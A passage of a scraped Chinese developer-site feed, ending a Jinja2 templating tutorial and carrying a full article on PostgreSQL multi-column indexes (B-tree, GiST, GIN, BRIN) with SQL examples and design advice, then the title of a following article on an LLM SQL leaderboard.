    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'张三'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-number">25</span>, <span class="hljs-string">'email'</span>: <span class="hljs-string">'zhangsan@example.com'</span>},
    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'李四'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-number">30</span>, <span class="hljs-string">'email'</span>: <span class="hljs-string">'lisi@example.com'</span>},
    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'王五'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-number">28</span>, <span class="hljs-string">'email'</span>: <span class="hljs-string">'wangwu@example.com'</span>}
]

result = template.render(users=users, title=<span class="hljs-string">'用户列表'</span>)
<span class="hljs-built_in">print</span>(result)
</code></pre>
<p><strong>模板文件 (user_list.html)</strong> ：</p>
<pre><code class="hljs language-python" lang="python">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;{{ title }}&lt;/title&gt;
    &lt;style&gt;
        table { border-collapse: collapse; width: <span class="hljs-number">100</span>%; }
        th, td { border: 1px solid <span class="hljs-comment">#ddd; padding: 8px; text-align: left; }</span>
        th { background-color: <span class="hljs-comment">#f2f2f2; }</span>
        tr:nth-child(even) { background-color: <span class="hljs-comment">#f9f9f9; }</span>
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;{{ title }}&lt;/h1&gt;
    
    &lt;table&gt;
        &lt;tr&gt;
            &lt;th&gt;序号&lt;/th&gt;
            &lt;th&gt;姓名&lt;/th&gt;
            &lt;th&gt;年龄&lt;/th&gt;
            &lt;th&gt;邮箱&lt;/th&gt;
        &lt;/tr&gt;
        
        {% <span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> users %}
        &lt;tr&gt;
            &lt;td&gt;{{ loop.index }}&lt;/td&gt;
            &lt;td&gt;{{ user.name }}&lt;/td&gt;
            &lt;td&gt;{{ user.age }}&lt;/td&gt;
            &lt;td&gt;{{ user.email }}&lt;/td&gt;
        &lt;/tr&gt;
        {% <span class="hljs-keyword">else</span> %}
        &lt;tr&gt;
            &lt;td colspan=<span class="hljs-string">"4"</span>&gt;暂无用户数据&lt;/td&gt;
        &lt;/tr&gt;
        {% endfor %}
    &lt;/table&gt;
    
    &lt;p&gt;共 {{ users|length }} 条记录&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h4 data-id="heading-32">6.2 配置文件生成</h4>
<p><strong>数据文件 (config.yaml)</strong> ：</p>
<pre><code class="hljs language-python" lang="python">servers:
  - name: web-server
    ip: <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span>
    port: <span class="hljs-number">80</span>
    services: [<span class="hljs-string">'nginx'</span>, <span class="hljs-string">'php-fpm'</span>]
  - name: db-server
    ip: <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.20</span>
    port: <span class="hljs-number">3306</span>
    services: [<span class="hljs-string">'mysql'</span>]
</code></pre>
<p><strong>模板文件 (server.conf.j2)</strong> ：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 自动生成的服务器配置</span>
<span class="hljs-comment"># 生成时间: {{ now() }}</span>

{% <span class="hljs-keyword">for</span> server <span class="hljs-keyword">in</span> servers %}
server {
    server_name {{ server.name }};
    listen {{ server.ip }}:{{ server.port }};
    
    {% <span class="hljs-keyword">for</span> service <span class="hljs-keyword">in</span> server.services %}
    <span class="hljs-comment"># {{ service }} 服务配置</span>
    {% endfor %}
}
{% endfor %}
</code></pre>
<p><strong>生成脚本</strong>：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> yaml
<span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Environment, FileSystemLoader
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime

<span class="hljs-keyword">def</span> <span class="hljs-title function_">now</span>():
    <span class="hljs-keyword">return</span> datetime.now().strftime(<span class="hljs-string">'%Y-%m-%d %H:%M:%S'</span>)

<span class="hljs-comment"># 加载数据</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'config.yaml'</span>, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:
    data = yaml.safe_load(f)

<span class="hljs-comment"># 配置环境</span>
env = Environment(loader=FileSystemLoader(<span class="hljs-string">'templates'</span>))
env.<span class="hljs-built_in">globals</span>[<span class="hljs-string">'now'</span>] = now

<span class="hljs-comment"># 渲染模板</span>
template = env.get_template(<span class="hljs-string">'server.conf.j2'</span>)
config_content = template.render(servers=data[<span class="hljs-string">'servers'</span>])

<span class="hljs-comment"># 保存结果</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'nginx.conf'</span>, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:
    f.write(config_content)
</code></pre>
<h3 data-id="heading-33">结尾</h3>
<p>挺好用的</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[PostgreSQL 多列索引（组合索引）]]></title>    <link>https://juejin.cn/post/7591786340322443298</link>    <guid>https://juejin.cn/post/7591786340322443298</guid>    <pubDate>2026-01-06T06:32:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591786340322443298" data-draft-id="7592017365145813032" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="PostgreSQL 多列索引（组合索引）"/> <meta itemprop="keywords" content="PostgreSQL"/> <meta itemprop="datePublished" content="2026-01-06T06:32:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="光蛋"/> <meta itemprop="url" content="https://juejin.cn/user/3537560778573467"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            PostgreSQL 多列索引（组合索引）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3537560778573467/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    光蛋
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T06:32:37.000Z" title="Tue Jan 06 2026 06:32:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">PostgreSQL 多列索引原理与实践指南</h2>
<p><strong>导语</strong>：在 PostgreSQL 数据库优化中，多列索引是提升多字段条件查询性能的核心手段，但多数开发者容易因索引类型选择、列顺序设计不当导致索引失效。本文结合 B-tree、GiST、GIN、BRIN 四种支持类型的实战案例，详细拆解多列索引的核心特性、查询匹配规则及落地最佳实践，帮你避开优化误区。</p>
<h3 data-id="heading-1">一、多列索引基础认知</h3>
<h4 data-id="heading-2">1.1 什么是多列索引？</h4>
<p>多列索引是基于表中多个字段创建的索引结构，能在一次索引扫描中匹配多个字段的过滤条件，减少回表查询次数，相比单列索引更适配“多字段组合查询”场景。</p>
<h4 data-id="heading-3">1.2 支持的索引类型</h4>
<p>PostgreSQL 仅 4 种索引类型支持多列索引，不同类型适配场景差异显著：</p>
<ul>
<li><strong>B-tree</strong>：默认索引类型，适用于等值查询、范围查询（如数值/字符串比较）；</li>
<li><strong>GiST</strong>：通用搜索树，适配空间数据（如经纬度）、全文检索等复杂类型查询；</li>
<li><strong>GIN</strong>：通用倒排索引，专为数组、JSONB 等多值类型设计；</li>
<li><strong>BRIN</strong>：块范围索引，轻量级索引，适用于海量有序数据（如时间序列）。</li>
</ul>
<h4 data-id="heading-4">1.3 核心限制</h4>
<p>多列索引（含 <code>INCLUDE</code> 子句附加列）最多支持 32 列。这里的 <code>INCLUDE</code> 子句附加列，指的是在索引中额外包含的非索引键列——这类列不参与索引的排序和查找逻辑，仅用于“覆盖索引扫描”场景（查询所需列均在索引中，无需回表）。若需突破32列的限制，需修改源代码文件 <code>pg_config_manual.h</code> 并重新编译 PostgreSQL，<strong>生产环境不建议随意调整</strong>。</p>
<h3 data-id="heading-5">二、实战：多列索引的创建与应用（分类型）</h3>
<p>以下结合各索引类型的核心适配场景，分别给出表结构、索引创建及查询示例，直观展示多列索引的使用方式。</p>
<h4 data-id="heading-6">2.1 B-tree 多列索引：多字段等值/范围查询</h4>
<p><strong>场景</strong>：存储设备目录信息，频繁按“主设备号（major）+ 次设备号（minor）”组合查询设备名称。</p>
<h5 data-id="heading-7">表结构定义</h5>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> test2 (
  major <span class="hljs-type">int</span>,    <span class="hljs-comment">-- 主设备号</span>
  minor <span class="hljs-type">int</span>,    <span class="hljs-comment">-- 次设备号</span>
  name <span class="hljs-type">varchar</span>  <span class="hljs-comment">-- 设备名称</span>
);

<span class="hljs-comment">-- 高频查询语句</span>
<span class="hljs-keyword">SELECT</span> name <span class="hljs-keyword">FROM</span> test2 <span class="hljs-keyword">WHERE</span> major <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> minor <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;
</code></pre>
<h5 data-id="heading-8">索引创建</h5>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 基础 B-tree 多列索引（默认类型，适配等值查询）</span>
<span class="hljs-keyword">CREATE</span> INDEX test2_mm_idx <span class="hljs-keyword">ON</span> test2 (major, minor);

<span class="hljs-comment">-- 含 INCLUDE 子句的多列索引（实现覆盖索引扫描，无需回表）</span>
<span class="hljs-keyword">CREATE</span> INDEX test2_mm_include_idx <span class="hljs-keyword">ON</span> test2 (major, minor) INCLUDE (name);
</code></pre>
<h5 data-id="heading-9">优化效果</h5>
<p>未创建索引时需全表扫描；创建 <code>test2_mm_idx</code> 后可快速定位记录；使用<code>test2_mm_include_idx</code> 可直接从索引获取 <code>name</code>，避免回表，效率进一步提升。</p>
<h4 data-id="heading-10">2.2 GiST 多列索引：空间数据多条件查询</h4>
<p><strong>场景</strong>：存储外卖配送区域与订单时间，频繁查询“某区域内指定时间段的配送订单”。</p>
<h5 data-id="heading-11">表结构定义</h5>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 需先创建 PostGIS 扩展（支持空间类型）</span>
<span class="hljs-keyword">CREATE</span> EXTENSION IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> postgis;

<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> delivery_orders (
  order_id <span class="hljs-type">int</span> <span class="hljs-keyword">primary</span> key,
  delivery_area geometry(Polygon),  <span class="hljs-comment">-- 配送区域（空间类型）</span>
  create_time <span class="hljs-type">timestamp</span>             <span class="hljs-comment">-- 订单创建时间</span>
);

<span class="hljs-comment">-- 高频查询语句：查询经度116.3-116.4、纬度39.9-40.0区域内1小时内的订单</span>
<span class="hljs-keyword">SELECT</span> order_id <span class="hljs-keyword">FROM</span> delivery_orders 
<span class="hljs-keyword">WHERE</span> ST_Intersects(delivery_area, ST_MakeEnvelope(<span class="hljs-number">116.3</span>, <span class="hljs-number">39.9</span>, <span class="hljs-number">116.4</span>, <span class="hljs-number">40.0</span>))
  <span class="hljs-keyword">AND</span> create_time <span class="hljs-operator">&gt;</span> NOW() <span class="hljs-operator">-</span> <span class="hljs-type">INTERVAL</span> <span class="hljs-string">'1 hour'</span>;
</code></pre>
<h5 data-id="heading-12">索引创建</h5>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- GiST 多列索引（第一列放空间列，保证区分度）</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_delivery_area_time <span class="hljs-keyword">ON</span> delivery_orders <span class="hljs-keyword">USING</span> GiST (delivery_area, create_time);
</code></pre>
<h5 data-id="heading-13">优化效果</h5>
<p>GiST 索引可同时匹配空间条件和时间条件，通过第一列 <code>delivery_area</code> 快速缩小扫描范围，避免全表扫描空间数据，大幅提升查询效率。</p>
<h4 data-id="heading-14">2.3 GIN 多列索引：多值类型组合查询</h4>
<p><strong>场景</strong>：存储文章标签（数组）和属性（JSONB），频繁按标签、属性的任意组合查询文章。</p>
<h5 data-id="heading-15">表结构定义</h5>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> articles (
  id <span class="hljs-type">int</span> <span class="hljs-keyword">primary</span> key,
  tags text[],          <span class="hljs-comment">-- 文章标签（多值，如 ['数据库','PostgreSQL']）</span>
  attrs jsonb           <span class="hljs-comment">-- 文章属性（多键，如 {'type':'技术','level':'进阶'}）</span>
);

<span class="hljs-comment">-- 高频查询语句（3种常见组合）</span>
<span class="hljs-comment">-- 1. 仅按标签查询</span>
<span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> articles <span class="hljs-keyword">WHERE</span> tags @<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">array</span>[<span class="hljs-string">'PostgreSQL'</span>];
<span class="hljs-comment">-- 2. 仅按属性查询</span>
<span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> articles <span class="hljs-keyword">WHERE</span> attrs ? <span class="hljs-string">'进阶'</span>;
<span class="hljs-comment">-- 3. 标签+属性组合查询</span>
<span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> articles <span class="hljs-keyword">WHERE</span> tags @<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">array</span>[<span class="hljs-string">'数据库'</span>] <span class="hljs-keyword">AND</span> attrs ? <span class="hljs-string">'技术'</span>;
</code></pre>
<h5 data-id="heading-16">索引创建</h5>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- GIN 多列索引（列顺序不影响效率）</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_articles_tags_attrs <span class="hljs-keyword">ON</span> articles <span class="hljs-keyword">USING</span> GIN (tags, attrs);
</code></pre>
<h5 data-id="heading-17">优化效果</h5>
<p>GIN 索引对任意列组合的查询效率一致，无需为不同组合创建多个索引，可高效支持多值类型的灵活查询。</p>
<h4 data-id="heading-18">2.4 BRIN 多列索引：海量有序数据查询</h4>
<p><strong>场景</strong>：存储系统日志，数据按时间戳有序分布，频繁按“时间+日志级别”组合查询。</p>
<h5 data-id="heading-19">表结构定义</h5>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> system_logs (
  log_id bigserial <span class="hljs-keyword">primary</span> key,
  log_time <span class="hljs-type">timestamp</span>,  <span class="hljs-comment">-- 日志时间（有序分布）</span>
  log_level <span class="hljs-type">varchar</span>,   <span class="hljs-comment">-- 日志级别（INFO/WARN/ERROR）</span>
  content text         <span class="hljs-comment">-- 日志内容</span>
);

<span class="hljs-comment">-- 高频查询语句：查询2024-01-01至今的ERROR级别日志</span>
<span class="hljs-keyword">SELECT</span> log_id <span class="hljs-keyword">FROM</span> system_logs 
<span class="hljs-keyword">WHERE</span> log_time <span class="hljs-operator">&gt;</span> <span class="hljs-string">'2024-01-01 00:00:00'</span> <span class="hljs-keyword">AND</span> log_level <span class="hljs-operator">=</span> <span class="hljs-string">'ERROR'</span>;
</code></pre>
<h5 data-id="heading-20">索引创建</h5>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- BRIN 多列索引（列顺序不影响，指定pages_per_range优化统计粒度）</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_logs_time_level <span class="hljs-keyword">ON</span> system_logs <span class="hljs-keyword">USING</span> BRIN (log_time, log_level)
<span class="hljs-keyword">WITH</span> (pages_per_range <span class="hljs-operator">=</span> <span class="hljs-number">10</span>);  <span class="hljs-comment">-- 每10个数据块统计一次，适配有序数据</span>
</code></pre>
<h5 data-id="heading-21">优化效果</h5>
<p>BRIN 索引体积极小（仅存储块统计信息），可快速匹配有序的 <code>log_time</code> 条件和 <code>log_level</code> 条件，适合海量日志这类有序数据的查询优化。</p>
<h3 data-id="heading-22">三、关键：不同类型多列索引的查询匹配规则</h3>
<p>多列索引的效率核心取决于 <strong>索引类型、列顺序、查询条件</strong> 的匹配度，以下是 4 种类型的核心规则拆解。</p>
<h4 data-id="heading-23">3.1 B-tree 多列索引：左前缀匹配是关键</h4>
<p>B-tree 多列索引遵循 <strong>左前缀匹配原则</strong>，先导列（最左侧列）的约束条件直接决定索引效率。</p>
<h5 data-id="heading-24">核心规则</h5>
<ol>
<li>先导列的 <strong>等值约束</strong> 是缩小扫描范围的核心；</li>
<li>第一个非等值约束列可进一步限制扫描范围，但该列右侧的约束仅用于过滤结果，无法缩小扫描范围；</li>
<li>若缺少先导列约束，索引退化为全扫描，效率低于全表扫描。</li>
</ol>
<h5 data-id="heading-25">示例解析</h5>
<p>假设有索引 <code>idx_abc ON t (a, b, c)</code>，查询条件：</p>
<pre><code class="hljs language-css" lang="css">SELECT * <span class="hljs-selector-tag">FROM</span> t WHERE <span class="hljs-selector-tag">a</span> = <span class="hljs-number">5</span> AND <span class="hljs-selector-tag">b</span> &gt;= <span class="hljs-number">42</span> AND c &lt; <span class="hljs-number">77</span>;
</code></pre>
<p><strong>原理说明</strong>：B-tree 按“左到右列顺序”逐层排序（类似字典），扫描范围仅能通过“最左侧连续有序前缀列”划定边界。</p>
<p><strong>扫描逻辑</strong>：</p>
<ul>
<li>a=5（先导列等值）：锁定所有 a=5 的索引片段，精准缩小范围；</li>
<li>b&gt;=42（第一个非等值）：在 a=5 片段内，b 有序，进一步锁定 b=42 开始的子片段；</li>
<li>c&lt;77（右侧约束）：c 仅在“a、b 均相同”时有序，在 a=5、b&gt;=42 片段中无全局有序性，无法划定边界，只能扫描后过滤。</li>
</ul>
<h4 data-id="heading-26">3.2 GiST 多列索引：第一列区分度决定效率</h4>
<p>GiST 支持任意列子集的查询条件，但效率核心取决于<strong>第一列的区分度</strong>：</p>
<ul>
<li>第一列区分度高（唯一值多）：即使后续列条件复杂，也能高效缩小扫描范围；</li>
<li>第一列区分度低（如枚举、布尔值）：即便后续列区分度高，整体扫描效率也会显著下降。</li>
</ul>
<p>适用场景补充：除空间数据外，也可用于全文检索的多条件查询（如“关键词+发布时间”）。</p>
<h4 data-id="heading-27">3.3 GIN 多列索引：列顺序不影响效率</h4>
<p>GIN 是唯一不依赖列顺序的索引类型，核心特性：</p>
<ul>
<li>支持任意列子集的查询条件；</li>
<li>不同列组合的查询效率基本一致。</li>
</ul>
<p>原因：GIN 采用倒排索引结构，各列独立维护索引条目，查询时直接匹配对应列的条目，无需依赖列顺序。</p>
<h4 data-id="heading-28">3.4 BRIN 多列索引：适配海量有序数据</h4>
<p>BRIN 特性与 GIN 类似（列顺序不影响效率），但有特殊前提：</p>
<ul>
<li>仅适用于<strong>数据有序分布</strong> 场景（如时间序列、自增 ID）；</li>
<li>若需为不同列设置不同 <code>pages_per_range</code> 参数，可创建多个单列 BRIN 索引替代多列索引。</li>
</ul>
<p>原理：BRIN 存储数据块的统计信息（如最大值、最小值），查询时先匹配块统计信息过滤无效块，再扫描有效块，无需依赖列顺序。</p>
<h4 data-id="heading-29">通用注意事项</h4>
<p>只有查询条件使用索引类型支持的操作符，索引起作用。例如：B-tree 支持 <code>=</code>、<code>&gt;=</code>；GiST 支持空间操作符 <code>ST_Intersects</code>、<code>@&gt;</code>；GIN 支持数组操作符 <code>@&gt;</code>、JSONB 操作符 <code>?</code>，使用非支持操作符会导致索引失效。</p>
<h3 data-id="heading-30">四、落地最佳实践：多列索引的设计原则</h3>
<h4 data-id="heading-31">4.1 优先使用单列索引</h4>
<p>绝大多数场景下，单列索引足以满足需求，优势：</p>
<ul>
<li>存储空间更小，维护成本更低（插入/更新/删除的索引开销小）；</li>
<li>适配更灵活的查询条件，避免因列顺序不当导致索引失效。</li>
</ul>
<h4 data-id="heading-32">4.2 谨慎设计多列索引的列顺序</h4>
<p>针对 B-tree/GiST 索引（列顺序影响效率），设计原则：</p>
<ol>
<li>区分度高的列放左侧；</li>
<li>频繁用于等值查询的列放左侧，范围查询列放右侧。</li>
</ol>
<h4 data-id="heading-33">4.3 限制列数：不超过 3 列</h4>
<p>超过 3 列的多列索引实用性极低，仅适用于“固定组合条件”的程式化查询（如特定报表）。过多列会导致索引体积膨胀，维护成本急剧上升。</p>
<h4 data-id="heading-34">4.4 结合查询场景选择索引类型</h4>

























<table><thead><tr><th>查询场景</th><th>推荐索引类型</th></tr></thead><tbody><tr><td>多字段等值/范围查询（如 major = ? AND minor = ?）</td><td>B-tree</td></tr><tr><td>空间数据/全文检索多条件查询</td><td>GiST</td></tr><tr><td>数组/JSONB 多值组合查询</td><td>GIN</td></tr><tr><td>海量有序数据（如日志、时间序列）查询</td><td>BRIN</td></tr></tbody></table>
<h3 data-id="heading-35">五、总结</h3>
<p>多列索引是 PostgreSQL 多字段查询优化的重要工具，但需“按需设计”：</p>
<ul>
<li>B-tree/GiST 需关注列顺序（B-tree 左前缀、GiST 第一列区分度）；</li>
<li>GIN/BRIN 无需考虑列顺序，分别适配多值类型、海量有序数据；</li>
<li>优先使用单列索引，多列索引列数建议不超过 3 列，避免过度设计。</li>
</ul>
<p>优化验证：可通过 <code>EXPLAIN ANALYZE</code> 查看执行计划，确认索引是否有效使用。</p>
<p><strong>延伸阅读</strong>：PostgreSQL 官方文档 11.5 节（索引类型对比）、11.9 节（索引配置最佳实践）。</p>
<p><strong>导语</strong>：在 PostgreSQL 数据库优化中，多列索引是提升多字段条件查询性能的核心手段，但多数开发者容易因索引类型选择、列顺序设计不当导致索引失效。本文结合实战案例，详细拆解多列索引的核心特性、各类型索引的匹配规则及落地最佳实践，帮你避开优化误区。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SCALE | 2025 年 12 月《大模型 SQL 能力排行榜》发布]]></title>    <link>https://juejin.cn/post/7591871204568612890</link>    <guid>https://juejin.cn/post/7591871204568612890</guid>    <pubDate>2026-01-06T06:52:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591871204568612890" data-draft-id="7591861857466105894" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SCALE | 2025 年 12 月《大模型 SQL 能力排行榜》发布"/> <meta itemprop="keywords" content="数据库,SQL,AIGC"/> <meta itemprop="datePublished" content="2026-01-06T06:52:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="爱可生开源社区"/> <meta itemprop="url" content="https://juejin.cn/user/1480387593251847"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SCALE | 2025 年 12 月《大模型 SQL 能力排行榜》发布
